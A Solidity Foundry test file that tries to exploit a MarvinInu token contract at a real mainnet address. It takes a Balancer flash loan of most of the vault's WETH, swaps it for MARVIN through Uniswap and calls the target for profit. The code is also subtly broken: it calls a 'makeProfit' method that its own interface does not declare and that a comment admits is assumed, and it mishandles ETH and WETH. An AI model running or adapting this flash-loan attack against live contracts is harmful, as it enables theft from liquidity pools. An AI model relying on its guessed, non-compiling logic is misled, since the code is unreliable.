// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface IMarvinInu {
    function uniswapV2Router() external returns (address);
    function uniswapV2Pair() external returns (address);
    function deadAddress() external returns (address);
    function marketingWallet() external returns (address);
    function devWallet() external returns (address);
    function maxTransactionAmount() external returns (uint256);
    function swapTokensAtAmount() external returns (uint256);
    function maxWallet() external returns (uint256);
    function percentForLPBurn() external returns (uint256);
    function lpBurnEnabled() external returns (bool);
    function lpBurnFrequency() external returns (uint256);
    function lastLpBurnTime() external returns (uint256);
    function manualBurnFrequency() external returns (uint256);
    function lastManualLpBurnTime() external returns (uint256);
    function limitsInEffect() external returns (bool);
    function tradingActive() external returns (bool);
    function swapEnabled() external returns (bool);
    function transferDelayEnabled() external returns (bool);
    function buyTotalFees() external returns (uint256);
    function buyMarketingFee() external returns (uint256);
    function buyLiquidityFee() external returns (uint256);
    function buyDevFee() external returns (uint256);
    function sellTotalFees() external returns (uint256);
    function sellMarketingFee() external returns (uint256);
    function sellLiquidityFee() external returns (uint256);
    function sellDevFee() external returns (uint256);
    function tokensForMarketing() external returns (uint256);
    function tokensForLiquidity() external returns (uint256);
    function tokensForDev() external returns (uint256);
    function _isExcludedMaxTransactionAmount(address) external returns (bool);
    function automatedMarketMakerPairs(address) external returns (bool);
    function owner() external view returns (address);
    function renounceOwnership() external;
    function transferOwnership(address) external;
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function allowance(address,address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function increaseAllowance(address,uint256) external returns (bool);
    function decreaseAllowance(address,uint256) external returns (bool);
    function enableTrading() external;
    function removeSnipers(address[] calldata) external;
    function addSnipers(address[] calldata) external;
    function removeLimits() external returns (bool);
    function disableTransferDelay() external returns (bool);
    function updateSwapTokensAtAmount(uint256) external returns (bool);
    function updateMaxTxnAmount(uint256) external;
    function updateMaxWalletAmount(uint256) external;
    function excludeFromMaxTransaction(address,bool) external;
    function updateSwapEnabled(bool) external;
    function updateBuyFees(uint256,uint256,uint256) external;
    function updateSellFees(uint256,uint256,uint256) external;
    function excludeFromFees(address,bool) external;
    function setAutomatedMarketMakerPair(address,bool) external;
    function updateMarketingWallet(address) external;
    function updateDevWallet(address) external;
    function getStatus(address) external view returns (bool);
    function isExcludedFromFees(address) external view returns (bool);
    function setAutoLPBurnSettings(uint256,uint256,bool) external;
    function manualBurnLiquidityPairTokens(uint256) external returns (bool);
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0x55a380d134d722006A5CE2d510562e1239D225B1;
        uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        valuableToken = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        flashloanProvider = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
        token = 0x55a380d134d722006A5CE2d510562e1239D225B1;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IBalancerVault(flashloanProvider).flashLoan(address(this), tokens, amounts, "");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {
    // Start by getting the WETH contract address
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Wrap some ETH to obtain WETH
    weth.deposit{value: amount}();

    // Transfer the wrapped WETH to the target contract
    weth.approve(target, amount);

    // Now perform a swap on the Uniswap pair for MARVIN tokens
    address[] memory path = new address[](2);
    path[0] = address(weth); // WETH token
    path[1] = token; // MARVIN token

    // Execute the swap
    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amount,
        0, // Set this to 0, as we will accept any amount of tokens
        path,
        address(this),
        block.timestamp
    );

    // At this point, we will have MARVIN tokens that we can use
    uint256 marvinBalance = IERC20(token).balanceOf(address(this));
    
    // Approve the MARVIN tokens for the target contract
    IERC20(token).approve(target, marvinBalance);

    // Now execute the operation on the target contract which allows to earn WETH in return
    IMarvinInu(target).makeProfit(marvinBalance); // Assuming there's a method like this in MarvinInu

    // Finally, withdraw the WETH obtained
    uint256 wethBalance = weth.balanceOf(address(this));
    weth.withdraw(wethBalance); // This will send WETH back as ETH to the caller

    // Transfer any remaining WETH back to the flashloan provider
    weth.transfer(flashloanProvider, wethBalance);
}
}


